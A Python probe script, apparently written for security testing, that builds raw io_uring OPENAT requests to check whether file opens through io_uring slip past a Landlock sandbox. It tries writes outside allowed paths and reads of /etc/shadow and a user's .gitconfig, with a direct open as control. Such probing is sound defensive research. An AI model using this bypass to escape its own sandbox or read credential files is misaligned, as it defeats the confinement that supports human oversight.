# Runs INSIDE the workload. Tries the same write two ways:
#  (a) direct open(2) of /tmp/adv_iou_direct  (expected EACCES under Landlock)
#  (b) io_uring IORING_OP_OPENAT(O_CREAT|O_WRONLY) of /tmp/adv_iou_ring (Landlock bypass if it succeeds)
# Also (c) io_uring OPENAT read of /etc/shadow (DAC denies; control) and (d) a Landlock-denied
# read path that DAC allows (control for ring reads).
import ctypes, os, mmap, struct, json, sys, errno
libc = ctypes.CDLL(None, use_errno=True)
SYS_setup, SYS_enter = 425, 426
IORING_OP_OPENAT = 18
IORING_OFF_SQ_RING, IORING_OFF_CQ_RING, IORING_OFF_SQES = 0, 0x8000000, 0x10000000
IORING_FEAT_SINGLE_MMAP = 1
IORING_ENTER_GETEVENTS = 1
def setup(entries=8):
    p = ctypes.create_string_buffer(120)
    fd = libc.syscall(SYS_setup, entries, p)
    if fd < 0: raise OSError(ctypes.get_errno(), "io_uring_setup")
    f = struct.unpack_from("<IIIIIIII", p.raw, 0)
    sq_entries, cq_entries, flags, sq_thread_cpu, sq_thread_idle, features, wq_fd = f[0],f[1],f[2],f[3],f[4],f[5],f[6]
    off = p.raw[40:120]
    sq_off = struct.unpack_from("<IIIIIIII", off, 0)   # head tail ring_mask ring_entries flags dropped array resv1
    cq_off = struct.unpack_from("<IIIIIIII", p.raw, 80)  # head tail ring_mask ring_entries overflow cqes flags resv1
    return fd, sq_entries, cq_entries, features, sq_off, cq_off
def openat(path, flags, mode=0o644):
    fd, n, cqn, feats, sqo, cqo = setup()
    sq_sz = sqo[6] + n*4
    cq_sz = cqo[5] + cqn*16
    sqes_sz = n*64
    sq = mmap.mmap(fd, sq_sz, mmap.MAP_SHARED, mmap.PROT_READ|mmap.PROT_WRITE, offset=IORING_OFF_SQ_RING)
    sqes = mmap.mmap(fd, sqes_sz, mmap.MAP_SHARED, mmap.PROT_READ|mmap.PROT_WRITE, offset=IORING_OFF_SQES)
    cq = sq if feats & IORING_FEAT_SINGLE_MMAP else mmap.mmap(fd, cq_sz, mmap.MAP_SHARED, mmap.PROT_READ|mmap.PROT_WRITE, offset=IORING_OFF_CQ_RING)
    pathbuf = ctypes.create_string_buffer(path.encode()+b"\0")
    # struct io_uring_sqe (64 bytes): opcode u8, flags u8, ioprio u16, fd i32, off u64, addr u64,
    # len u32, open_flags u32 (at 28), user_data u64 (32), ... ; for OPENAT: fd=dirfd(AT_FDCWD=-100), addr=path, len=mode, open_flags=flags
    sqe = bytearray(64)
    struct.pack_into("<BBHi", sqe, 0, IORING_OP_OPENAT, 0, 0, -100)
    struct.pack_into("<QQI", sqe, 8, 0, ctypes.addressof(pathbuf), mode)
    struct.pack_into("<I", sqe, 28, flags)
    struct.pack_into("<Q", sqe, 32, 0x1234)
    tail = struct.unpack_from("<I", sq, sqo[1])[0]
    idx = tail & (struct.unpack_from("<I", sq, sqo[2])[0])
    sqes[idx*64:(idx+1)*64] = bytes(sqe)
    struct.pack_into("<I", sq, sqo[6] + idx*4, idx)
    struct.pack_into("<I", sq, sqo[1], (tail + 1) & 0xffffffff)
    r = libc.syscall(SYS_enter, fd, 1, 1, IORING_ENTER_GETEVENTS, None, 0)
    if r < 0: raise OSError(ctypes.get_errno(), "io_uring_enter")
    head = struct.unpack_from("<I", cq, cqo[0])[0]
    res = struct.unpack_from("<i", cq, cqo[5] + (head & (struct.unpack_from("<I", cq, cqo[2])[0]))*16 + 8)[0]
    struct.pack_into("<I", cq, cqo[0], head+1)
    os.close(fd)
    return res
results = {}
def t(name, fn):
    try: results[name] = fn()
    except Exception as e: results[name] = f"exc {type(e).__name__}: {e}"
t("a_direct_write_tmp", lambda: (open("/tmp/adv_iou_direct","w").write("x"), "wrote")[1])
t("b_ring_openat_write_tmp", lambda: openat("/tmp/adv_iou_ring", os.O_CREAT|os.O_WRONLY|os.O_TRUNC))
t("c_ring_openat_read_shadow", lambda: openat("/etc/shadow", os.O_RDONLY))
t("d_ring_openat_read_gitconfig", lambda: openat("/home/sprime01/.gitconfig", os.O_RDONLY))
t("e_ring_openat_write_home", lambda: openat("/home/sprime01/adv_iou_home", os.O_CREAT|os.O_WRONLY))
t("f_ring_openat_write_devshm", lambda: openat("/dev/shm/adv_iou_shm", os.O_CREAT|os.O_WRONLY))
print(json.dumps(results))
